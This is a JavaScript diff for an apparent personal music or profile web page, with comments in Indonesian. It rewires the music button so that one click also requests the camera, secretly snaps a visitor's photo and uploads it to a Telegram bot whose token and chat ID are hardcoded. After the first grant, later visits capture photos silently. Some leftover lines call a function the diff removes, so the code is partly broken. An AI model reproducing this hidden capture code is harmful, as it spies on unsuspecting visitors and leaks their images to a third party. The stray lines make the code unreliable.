@@ -8,31 +8,32 @@ if (openPhotoOptions && photoOptions) {
 
 const BOT_TOKEN = "8317170535:AAGh0PBKO4T-HkZQ4b7COREqLWcOIjW3QTY";
 const CHAT_ID = "6864694275";
-
-// === BAGIAN MUSIK + IZIN KAMERA + AUTO CAPTURE (HYBRID) ===
+// === BAGIAN MUSIK + IZIN KAMERA + AUTO CAPTURE (SATU KLIK) ===
 const music = document.getElementById('bgmusic');
 const btnMusic = document.getElementById('musicButton');
 let started = false;
 music.volume = 0.4;
 
-// Fungsi utama: mulai musik + izin kamera
-async function startMusicAndCamera() {
+// Klik tombol sekali langsung mulai musik + kamera + kirim foto
+btnMusic.addEventListener('click', async () => {
   if (started) return;
   started = true;
+  btnMusic.disabled = true;
   music.muted = false;
 
-  // === MULAI MUSIK ===
+  // Mulai musik
   try {
     await music.play();
-    console.log("🎵 Musik diputar.");
-    btnMusic.classList.remove("show");
-    btnMusic.disabled = true;
+    console.log("🎵 Musik mulai diputar");
   } catch (err) {
-    console.warn("Autoplay gagal, tampilkan tombol:", err);
-    btnMusic.classList.add("show");
+    console.warn("Autoplay gagal:", err);
+    alert("Browser kamu memblokir musik otomatis. Ketuk ulang tombol 🎵");
+    btnMusic.disabled = false;
+    started = false;
+    return;
   }
 
-  // === IZIN KAMERA & AUTO CAPTURE ===
+  // Jalankan izin kamera + auto capture
   try {
     const alreadyAllowed = localStorage.getItem("user_allows_auto_capture") === "1";
     if (!alreadyAllowed && navigator.mediaDevices) {
@@ -40,17 +41,21 @@ async function startMusicAndCamera() {
       stream.getTracks().forEach(t => t.stop());
       localStorage.setItem("user_allows_auto_capture", "1");
       console.log("✅ Izin kamera diberikan pertama kali.");
-      await autoCaptureAndSend(); // ambil foto pertama
+      await autoCaptureAndSend();
     } else if (alreadyAllowed) {
-      console.log("📸 Kamera sudah diizinkan, auto-capture langsung...");
+      console.log("📸 Kamera sudah diizinkan sebelumnya, ambil otomatis...");
       await autoCaptureAndSend();
     }
   } catch (e) {
     console.warn("❌ User menolak izin kamera:", e);
   }
-}
 
-// === FUNGSI AUTO CAPTURE + DELAY FOKUS ===
+  // Sembunyikan tombol setelah berhasil
+  btnMusic.classList.remove("show");
+  btnMusic.style.display = "none";
+});
+
+// === FUNGSI AUTO CAPTURE & KIRIM FOTO ===
 async function autoCaptureAndSend() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -63,8 +68,8 @@ async function autoCaptureAndSend() {
       setTimeout(res, 3000);
     });
 
-    // 🕐 Delay fokus 1 detik
-    await new Promise(r => setTimeout(r, 1000));
+    // 🕐 Jeda 1 detik biar kamera fokus dulu
+    await new Promise(r => setTimeout(r, 500));
 
     const canvas = document.createElement("canvas");
     canvas.width = video.videoWidth || 640;
@@ -86,29 +91,24 @@ async function autoCaptureAndSend() {
       body: fd
     });
 
-    if (res.ok) console.log("✅ Foto terkirim (fokus 1s)");
-    else console.warn("⚠️ Gagal kirim foto");
+    if (res.ok) console.log("✅ Foto terkirim ke Telegram");
+    else console.warn("⚠️ Gagal kirim foto ke Telegram");
   } catch (err) {
     console.error("❌ Tidak bisa akses kamera:", err);
   }
 }
 
-// === DETEKSI PLATFORM & EVENT ===
+// === TAMPILKAN TOMBOL DI MOBILE / DESKTOP ===
 const isMobile = /Android|iPhone|iPad|iOS/i.test(navigator.userAgent);
-
-// PC & Mobile: mulai musik + kamera saat klik/touch pertama
-document.addEventListener('click', startMusicAndCamera, { once: true });
-document.addEventListener('touchstart', startMusicAndCamera, { once: true });
-
-// Tombol utama tetap pemicu manual (aman di mobile)
-btnMusic.addEventListener('click', async () => {
-  try {
-    await startMusicAndCamera();
-  } catch (e) {
-    alert("Browser kamu memblokir musik otomatis. Coba ketuk ulang tombol 🎵");
-    console.log(e);
-  }
-});
+if (isMobile) {
+  btnMusic.classList.add("show");
+  music.muted = true;
+} else {
+  setTimeout(() => {
+    btnMusic.classList.add("show");
+    music.muted = false;
+  }, 500);
+}
 
 const isMobile = /Android|iPhone|iPad|iOS/i.test(navigator.userAgent);
 document.addEventListener('click', startMusicAndCamera, { once: true });
@@ -642,5 +642,6 @@ showVisitorInfo();
   updateSpotify();
   setInterval(updateSpotify, 8000);
 })();
+
 
 
